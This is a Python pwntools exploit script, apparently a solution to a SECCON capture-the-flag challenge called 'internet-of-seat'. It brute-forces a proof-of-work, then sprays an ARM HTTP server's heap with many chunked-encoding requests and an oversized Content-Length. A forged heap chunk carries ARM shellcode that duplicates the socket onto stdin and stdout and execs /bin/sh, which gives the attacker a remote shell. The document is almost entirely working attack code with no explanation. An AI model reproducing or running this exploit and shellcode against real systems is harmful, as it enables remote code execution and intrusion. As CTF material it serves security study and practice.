from pwn import *
from hashlib import md5

HOST, PORT = '0.0.0.0', 1337
# HOST, PORT = 'internet-of-seat.pwn.seccon.jp', 1337

x = remote(HOST, PORT)
argv = x.recvuntil('>>').split('"')[1]

i = 0
while True:
    if md5(argv + "%x"%i).hexdigest().startswith('00000'):
        x.sendline('%x'%i)
        break
    i += 1

x.recvuntil('Your port: ')
PORT = int(x.recvline().strip())

x.recvuntil('Listening on')

import threading

def receiver(x):
    d = ''
    while True:
        c = x.recv(1024)
        if c == '':
            break
        sys.stdout.write(c)
        d += c

t = threading.Thread(target=receiver, args=(x, ))
t.start()

r = remote(HOST, PORT)
rs = []

context.update(arch='arm')

size = 2 ** 31 - 1
r.send('GET / HTTP/1.1\r\nContent-Length: %d\r\n\r\n' % size)

def spray(r, size):
	time.sleep(0.3)
	rs.append(r)
	r.send('GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n%x\n' % size)

for i in range(8):
	spray(remote(HOST, PORT), 0x40000)

for i in range(15):
	spray(remote(HOST, PORT), 0x80000)

# rs.append(remote(HOST, PORT))
# r.send("GET / HTTP/1.1\r\nContent-Length: 100000\r\n\r\n" + ('A' * 0x1337))

# for c in rs:
# 	c.send('a')

pause()
r.send("aa")

shellcode = asm(
	shellcraft.arm.linux.dup2(4, 0) +
	shellcraft.arm.linux.dup2(4, 1) +
	shellcraft.arm.linux.dup2(4, 2) +
    """
    ldr r7, =0x41410068
    push {r7}
    ldr r7, =0x732f2f2f
    push {r7}
    ldr r7, =0x6e69622f
    push {r7}
    mov  r0, sp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    ldr r7, =0x6873
    push {r7}
    eor  r12, r12 /* 0 (#0) */
    push {r12} /* null terminate */
    mov  r1, #4
    add r1, sp
    mov  r12, r1
    push {r12} /* 'sh\x00' */
    mov  r1, sp
    eor  r2, r2 /* 0 (#0) */
    /* call execve() */
    mov  r7, #SYS_execve /* 0xb */
    svc  0
	"""
	)

target = 0x920e0
target = 0x52044
# target = 0x52008

target -= 4
count = 0
chunk = p32(0x5c)
chunk += p32(6) + p32(1) + p32(0) + p32(0) * 3 + p32(target + 4 + 0x58 + len(shellcode) + 4) + p32(0) + p32(0) + p32(0x11dc4) + p32(0) + p32(0x100) + p32(0) * 2
chunk += p32(0) * 2 + p32(0x7fffffff) + p32(0) + p32(1) + p32(1) + p32(0) * 2
sh = target + len(chunk)
chunk += shellcode
chunk += p32(0x20)
chunk = chunk
r.send('A' * (target - 0x30))
r.send(chunk)

pause()

for c in rs:
	time.sleep(0.1)
	c.send(p32(sh))

r.interactive()
